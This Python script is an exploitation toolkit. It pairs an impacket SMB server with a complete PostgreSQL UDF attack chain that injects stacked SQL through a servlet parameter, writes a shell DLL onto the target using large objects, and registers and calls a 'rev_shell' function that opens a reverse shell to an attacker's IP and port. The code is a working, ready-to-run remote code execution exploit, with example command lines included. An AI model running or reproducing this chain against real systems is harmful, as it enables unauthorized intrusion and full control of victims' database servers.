#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Integrated SMB Server and Postgres UDF Exploitation Toolkit
This tool combines SMB server functionality with Postgres UDF exploitation capabilities.
"""

import os
import sys
import time
import signal
import queue
import shutil
import logging
import threading
import subprocess
import argparse
import requests
import binascii
import urllib.request
import urllib.parse
import urllib.error
import string
import random
import pkg_resources

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Global variables for SMB server
smb_server_process = None
smb_server_thread = None
smb_log_thread = None

# Thread function to read and print SMB server logs
def log_reader_thread(process):
    """Read from the process stdout/stderr and print to console."""
    try:
        for line in iter(process.stdout.readline, b''):
            decoded_line = line.decode('utf-8', errors='replace').rstrip()
            print(f"[SMB] {decoded_line}")
            sys.stdout.flush()
    except Exception as e:
        print(f"[!] Error in SMB log reader: {e}")

# Start Samba Server
def check_impacket_smbserver():
    """Check if impacket-smbserver is installed and accessible."""
    
    # Method 1: Check if the command is in PATH
    if shutil.which('impacket-smbserver'):
        print("[+] impacket-smbserver found in PATH")
        return 'impacket-smbserver'
    
    # Method 2: Check if impacket module is installed
    try:
        pkg_resources.get_distribution('impacket')
        print("[+] Impacket library is installed")
        
        # Try importing the smbserver module
        try:
            from impacket import smbserver
            print("[+] Impacket smbserver module can be imported")
            # Return None to indicate we should use the Python module
            return None
        except ImportError:
            print("[!] Cannot import smbserver module from impacket")
    except pkg_resources.DistributionNotFound:
        print("[!] Impacket library is not installed")
    
    # Method 3: Try executing the command directly
    try:
        result = subprocess.run(['impacket-smbserver', '-h'], 
                              capture_output=True, 
                              text=True, 
                              timeout=5)
        if result.returncode == 0:
            print("[+] impacket-smbserver can be executed")
            return 'impacket-smbserver'
    except FileNotFoundError:
        print("[!] impacket-smbserver command not found")
    except subprocess.TimeoutExpired:
        print("[!] impacket-smbserver execution timed out")
    except Exception as e:
        print(f"[!] Error executing impacket-smbserver: {e}")
    
    # Check alternative locations
    possible_paths = [
        '/usr/share/doc/python3-impacket/examples/smbserver.py',
        '/usr/local/bin/impacket-smbserver',
        '/usr/bin/impacket-smbserver'
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            print(f"[+] Found smbserver at: {path}")
            return path
    
    return False

def start_smb_server(share_name, share_path, interface="0.0.0.0", port=445):
    """
    Start impacket-smbserver and redirect output to console.
    
    Args:
        share_name (str): Name of the SMB share
        share_path (str): Path to the directory to share
        interface (str): Interface to bind to (default: "0.0.0.0")
        port (int): Port to listen on (default: 445)
    
    Returns:
        bool: True if server started successfully, False otherwise
    """
    global smb_server_process
    global smb_server_thread
    global smb_log_thread
    
    # Check if server is already running
    if smb_server_process and smb_server_process.poll() is None:
        print(f"[*] SMB server is already running (PID: {smb_server_process.pid})")
        return True
    
    # Make sure the share path exists - but don't create it if it doesn't
    share_path = os.path.abspath(share_path)
    if not os.path.exists(share_path):
        print(f"[!] Share path does not exist: {share_path}")
        print(f"[!] Please create it manually before running the server")
        return False
    
    # Get the SMB server executable or module
    smb_server_cmd = check_impacket_smbserver()
    if not smb_server_cmd:
        # Try to use the Python module directly
        try:
            from impacket import smbserver
            
            # Create a custom StreamHandler to capture logs
            class QueueHandler(logging.Handler):
                def __init__(self, queue):
                    super().__init__()
                    self.queue = queue
                
                def emit(self, record):
                    try:
                        msg = self.format(record)
                        self.queue.put(msg)
                    except Exception:
                        self.handleError(record)
            
            # Set up logging to capture SMB server output
            log_queue = queue.Queue()
            
            # Set up logger
            logger = logging.getLogger('impacket')
            logger.setLevel(logging.DEBUG)
            
            # Add handler to the logger
            queue_handler = QueueHandler(log_queue)
            queue_handler.setFormatter(logging.Formatter('%(message)s'))
            logger.addHandler(queue_handler)
            
            # Thread to print logs
            def log_printer():
                while True:
                    try:
                        message = log_queue.get(timeout=0.1)
                        print(f"[SMB] {message}")
                        sys.stdout.flush()
                    except queue.Empty:
                        if not smb_server_thread.is_alive():
                            break
                    except Exception as e:
                        print(f"[!] Error in log printer: {e}")
                        break
            
            def run_python_smb_server():
                try:
                    print(f"[*] Starting SMB server as Python module on {interface}:{port}")
                    print(f"[*] Share name: {share_name}, Share path: {share_path}")
                    
                    server = smbserver.SimpleSMBServer(interface=interface, port=port)
                    server.addShare(share_name, share_path, "SMB Share")
                    server.setSMB2Support(True)
                    
                    # Enable debugging on the server
                    server.setLogFile('')
                    
                    # Start the server
                    print("[+] SMB server started")
                    server.start()
                except KeyboardInterrupt:
                    print("[*] SMB server stopped by user")
                except Exception as e:
                    print(f"[!] Error running SMB server: {e}")
            
            # Start log printer thread
            log_thread = threading.Thread(target=log_printer, daemon=True)
            log_thread.start()
            
            # Start server in a separate thread
            smb_server_thread = threading.Thread(target=run_python_smb_server, daemon=True)
            smb_server_thread.start()
            print(f"[+] SMB server started in background thread")
            return True
            
        except ImportError:
            print("[!] Cannot import impacket.smbserver module")
            return False
    else:
        # Use the command-line version
        try:
            # Build command based on whether it's smbserver.py or impacket-smbserver
            if smb_server_cmd.endswith('smbserver.py'):
                # For smbserver.py script (older versions)
                cmd = [sys.executable, smb_server_cmd, share_name, share_path, '-debug']
            elif 'impacket-smbserver' in smb_server_cmd:
                # For newer impacket-smbserver command
                cmd = [smb_server_cmd, share_name, share_path, '-debug']
            else:
                # Fallback for any other case
                cmd = [smb_server_cmd, share_name, share_path, '-debug']
            
            # Add SMB2 support if possible
            cmd.append("-smb2support")
            
            # Start the server as a subprocess with pipes for stdout/stderr
            print(f"[*] Starting SMB server: {' '.join(cmd)}")
            
            # Use pipes to capture output
            smb_server_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                bufsize=1,
                universal_newlines=False
            )
            
            # Start thread to read and print logs
            smb_log_thread = threading.Thread(
                target=log_reader_thread, 
                args=(smb_server_process,),
                daemon=True
            )
            smb_log_thread.start()
            
            # Give it a moment to start
            time.sleep(1)
            
            # Check if process is running
            if smb_server_process.poll() is None:
                print(f"[+] SMB server started with PID: {smb_server_process.pid}")
                
                # Store PID to file for later reference if needed
                pid_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "smb_server.pid")
                try:
                    with open(pid_file, "w") as f:
                        f.write(str(smb_server_process.pid))
                    print(f"[+] SMB server PID stored in {pid_file}")
                except Exception as e:
                    print(f"[!] Warning: Could not write PID file: {e}")
                
                return True
            else:
                error = smb_server_process.communicate()[0]
                print(f"[!] SMB server failed to start: {error.decode('utf-8', errors='replace')}")
                return False
                
        except Exception as e:
            print(f"[!] Error starting SMB server: {e}")
            return False

def stop_smb_server():
    """Stop the running SMB server."""
    global smb_server_process
    global smb_server_thread
    global smb_log_thread
    
    if smb_server_process:
        try:
            print(f"[*] Stopping SMB server (PID: {smb_server_process.pid})")
            smb_server_process.terminate()
            
            # Wait for process to terminate
            try:
                smb_server_process.wait(timeout=5)
                print("[+] SMB server stopped")
            except subprocess.TimeoutExpired:
                print("[!] SMB server did not terminate gracefully, killing it...")
                smb_server_process.kill()
                smb_server_process.wait()
                print("[+] SMB server killed")
                
            smb_server_process = None
            return True
        except Exception as e:
            print(f"[!] Error stopping SMB server: {e}")
            return False
    elif smb_server_thread and smb_server_thread.is_alive():
        # Unfortunately, we can't easily stop a thread in Python
        # This is a best-effort approach
        print("[*] SMB server is running in a thread, cannot stop it cleanly")
        print("[*] The server will continue running until the script exits")
        return False
    else:
        # Try to find a running SMB server using the PID file
        pid_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "smb_server.pid")
        if os.path.exists(pid_file):
            try:
                with open(pid_file, "r") as f:
                    pid = int(f.read().strip())
                
                # Check if process is running
                try:
                    # On Windows
                    if os.name == 'nt':
                        subprocess.run(["taskkill", "/F", "/PID", str(pid)], check=True)
                    # On Unix
                    else:
                        os.kill(pid, signal.SIGTERM)
                        time.sleep(1)
                        # Check if it's still running
                        try:
                            os.kill(pid, 0)  # This will raise an error if process is gone
                            # Process still exists, forcefully kill it
                            os.kill(pid, signal.SIGKILL)
                        except OSError:
                            # Process is already gone
                            pass
                    
                    print(f"[+] SMB server with PID {pid} stopped")
                    
                    # Remove PID file
                    os.remove(pid_file)
                    return True
                except Exception as e:
                    print(f"[!] Error stopping SMB server with PID {pid}: {e}")
                    return False
            except Exception as e:
                print(f"[!] Error reading PID file: {e}")
                return False
        else:
            print("[*] No SMB server is running or PID file not found")
            return True

def cleanup_on_exit(signum, frame):
    """Signal handler to clean up resources before exiting."""
    print("\n[*] Shutting down...")
    stop_smb_server()
    sys.exit(0)

# PostgreSQL UDF Exploitation functions
def log(msg):
    """Log a message to the console."""
    print(msg)

def make_request(url, sql):
    """Make a request to the target server with the SQL injection payload."""
    log(f"[*] Executing query: {sql[0:80]}")
    inj = url % sql
    inj = inj.replace(' ', '+')
    r = requests.get(inj, verify=False)
    return r

def delete_lo(url, loid):
    """Delete an existing large object if it exists."""
    log("[+] Deleting existing LO...")
    sql = f"SELECT lo_unlink({loid})"
    make_request(url, sql)

def create_lo(url, loid):
    """Create a large object for UDF injection."""
    log("[+] Creating LO for UDF injection...")
    sql = f"SELECT lo_import($$C:\\windows\\win.ini$$,{loid})"
    make_request(url, sql)
   
def inject_udf(url, loid, udf_path):
    """Inject the UDF payload into the large object."""
    # Check if UDF file exists
    if not os.path.exists(udf_path):
        log(f"[-] UDF file not found: {udf_path}")
        return False
        
    # Read the UDF DLL
    with open(udf_path, 'rb') as file:
        udf = binascii.hexlify(file.read()).decode('utf-8')
    
    log(f"[+] Injecting payload of length {len(udf)} into LO...")
    for i in range(0, ((len(udf)-1)//4096+1)):
        udf_chunk = udf[i*4096:(i+1)*4096]
        if i == 0:
            sql = f"UPDATE PG_LARGEOBJECT SET data=decode($${udf_chunk}$$, $$hex$$) where loid={loid} and pageno={i}"
        else:
            sql = f"INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES ({loid}, {i}, decode($${udf_chunk}$$, $$hex$$))"
        make_request(url, sql)
    return True

def export_udf(url, loid, output_path=None):
    """Export the UDF library to the filesystem."""
    if output_path is None:
        output_path = "C:\\Users\\Public\\postgres_udf_shell.dll"
    
    log("[+] Exporting UDF library to filesystem...")
    sql = f"SELECT lo_export({loid}, $${output_path}$$)"
    make_request(url, sql)
   
def create_udf_func(url, dll_path=None, func_name="rev_shell"):
    """Create a function that uses the UDF."""
    if dll_path is None:
        dll_path = "C:\\Users\\Public\\postgres_udf_shell.dll"
    
    log("[+] Creating function...")
    sql = f"create or replace function {func_name}(text, integer) returns VOID as $${dll_path}$$, $$connect_back$$ language C strict"
    make_request(url, sql)

def trigger_udf(url, ip, port, func_name="rev_shell"):
    """Trigger the UDF to establish a reverse shell."""
    log("[+] Launching reverse shell...")
    sql = f"select {func_name}($${ip}$$, {port})"
    make_request(url, sql)

# Main execution function for PostgreSQL UDF exploitation
def run_postgres_exploit(server, attacker, port, udf_path, loid=1337, output_path=None, func_name="rev_shell"):
    """
    Run the complete PostgreSQL UDF exploitation chain.
    
    Args:
        server (str): Target server (IP:port)
        attacker (str): Attacker's IP address for reverse shell
        port (str/int): Port for reverse shell
        udf_path (str): Path to the UDF DLL file
        loid (int, optional): Large object ID to use. Defaults to 1337.
        output_path (str, optional): Path on target to save the DLL. Defaults to None.
        func_name (str, optional): Name for the UDF function. Defaults to "rev_shell".
    """
    sqli_url = f"https://{server}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--"
    
    # Check if UDF file exists
    if not os.path.exists(udf_path):
        log(f"[-] UDF file not found: {udf_path}")
        return False
    
    try:
        delete_lo(sqli_url, loid)
        create_lo(sqli_url, loid)
        if not inject_udf(sqli_url, loid, udf_path):
            return False
        export_udf(sqli_url, loid, output_path)
        create_udf_func(sqli_url, output_path, func_name)
        trigger_udf(sqli_url, attacker, port, func_name)
        return True
    except Exception as e:
        log(f"[-] Error during PostgreSQL exploitation: {e}")
        return False

def setup_arg_parser():
    """Set up and return an argument parser for the command-line interface."""
    parser = argparse.ArgumentParser(
        description="Integrated SMB Server and PostgreSQL UDF Exploitation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Start SMB server only:
    %(prog)s --smb-only --share-name TOOLS --share-path /tmp/tools
  
  Run PostgreSQL UDF exploit only:
    %(prog)s --postgres-only --target-server 192.168.1.10:8080 --attacker-ip 192.168.1.5 --listen-port 4444 --udf-path ./postgres_udf_shell.dll
  
  Run both with custom options:
    %(prog)s --share-name PAYLOAD --share-path ./existing_payloads --target-server 192.168.1.10:8080 --attacker-ip 192.168.1.5 --listen-port 4444 --udf-path ./existing_payloads/postgres_udf_shell.dll
        """
    )
    
    # Create mutually exclusive group for running modes
    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument('--smb-only', action='store_true', help='Run only the SMB server')
    mode_group.add_argument('--postgres-only', action='store_true', help='Run only the PostgreSQL UDF exploit')
    
    # SMB Server options
    smb_group = parser.add_argument_group('SMB Server Options')
    smb_group.add_argument('--share-name', type=str, default='SHARE', help='Name of the SMB share (default: SHARE)')
    smb_group.add_argument('--share-path', type=str, default='./share', help='Path to the directory to share (default: ./share)')
    smb_group.add_argument('--interface', type=str, default='0.0.0.0', help='Interface to bind the SMB server to (default: 0.0.0.0)')
    smb_group.add_argument('--smb-port', type=int, default=445, help='Port for the SMB server (default: 445)')
    
    # PostgreSQL UDF options
    postgres_group = parser.add_argument_group('PostgreSQL UDF Exploit Options')
    postgres_group.add_argument('--target-server', type=str, help='Target server IP:port for PostgreSQL exploit')
    postgres_group.add_argument('--attacker-ip', type=str, help='Attacker IP for reverse shell')
    postgres_group.add_argument('--listen-port', type=str, help='Port to listen on for reverse shell')
    postgres_group.add_argument('--udf-path', type=str, default='./postgres_udf_shell.dll', help='Path to the UDF DLL (default: ./postgres_udf_shell.dll)')
    postgres_group.add_argument('--output-path', type=str, help='Path on target to save the DLL (default: C:\\Users\\Public\\postgres_udf_shell.dll)')
    postgres_group.add_argument('--loid', type=int, default=1337, help='Large object ID to use (default: 1337)')
    postgres_group.add_argument('--func-name', type=str, default='rev_shell', help='Name for the UDF function (default: rev_shell)')
    
    return parser

def validate_args(args):
    """Validate command-line arguments."""
    # If running in SMB-only mode
    if args.smb_only:
        # Check if share path exists
        if not os.path.exists(args.share_path):
            return False, f"Share path does not exist: {args.share_path}. Please create it manually first."
    
    # If running in PostgreSQL-only mode or combined mode
    if args.postgres_only or (not args.smb_only and not args.postgres_only):
        if not args.target_server:
            return False, "Target server is required for PostgreSQL exploit"
        if not args.attacker_ip:
            return False, "Attacker IP is required for PostgreSQL exploit"
        if not args.listen_port:
            return False, "Listen port is required for PostgreSQL exploit"
        if not os.path.exists(args.udf_path):
            return False, f"UDF file not found: {args.udf_path}"
    
    # If running both, also check SMB share path
    if not args.smb_only and not args.postgres_only:
        if not os.path.exists(args.share_path):
            return False, f"Share path does not exist: {args.share_path}. Please create it manually first."
    
    return True, ""

def main():
    """Main entry point for the tool."""
    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, cleanup_on_exit)
    signal.signal(signal.SIGTERM, cleanup_on_exit)
    
    # Parse command-line arguments
    parser = setup_arg_parser()
    args = parser.parse_args()
    
    # Validate arguments
    valid, error_msg = validate_args(args)
    if not valid:
        print(f"[-] Error: {error_msg}")
        parser.print_help()
        sys.exit(1)
    
    try:
        # Start SMB server if not in PostgreSQL-only mode
        if not args.postgres_only:
            # Start SMB server (without creating the directory)
            smb_started = start_smb_server(
                args.share_name,
                args.share_path,
                args.interface,
                args.smb_port
            )
            
            if not smb_started:
                print("[-] Failed to start SMB server")
                sys.exit(1)
            
            print(f"[+] SMB server started successfully")
            print(f"[*] Share {args.share_name} available at \\\\{args.interface}\\{args.share_name}")
        
        # Run PostgreSQL UDF exploit if not in SMB-only mode
        if not args.smb_only:
            print("\n[*] Starting PostgreSQL UDF exploit...")
            
            exploit_success = run_postgres_exploit(
                args.target_server,
                args.attacker_ip,
                args.listen_port,
                args.udf_path,
                args.loid,
                args.output_path,
                args.func_name
            )
            
            if exploit_success:
                print("[+] PostgreSQL UDF exploit completed successfully")
            else:
                print("[-] PostgreSQL UDF exploit failed")
                # Don't exit here to keep the SMB server running if started
        
        # If running only the SMB server, wait for keyboard interrupt
        if args.smb_only:
            print("\n[*] Press Ctrl+C to stop the SMB server and exit")
            while True:
                time.sleep(1)
                
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
    except Exception as e:
        print(f"\n[-] Error: {e}")
    finally:
        # Clean up resources
        if not args.postgres_only:
            print("[*] Stopping SMB server...")
            stop_smb_server()
        
        print("[*] Exiting...")

if __name__ == "__main__":
    main()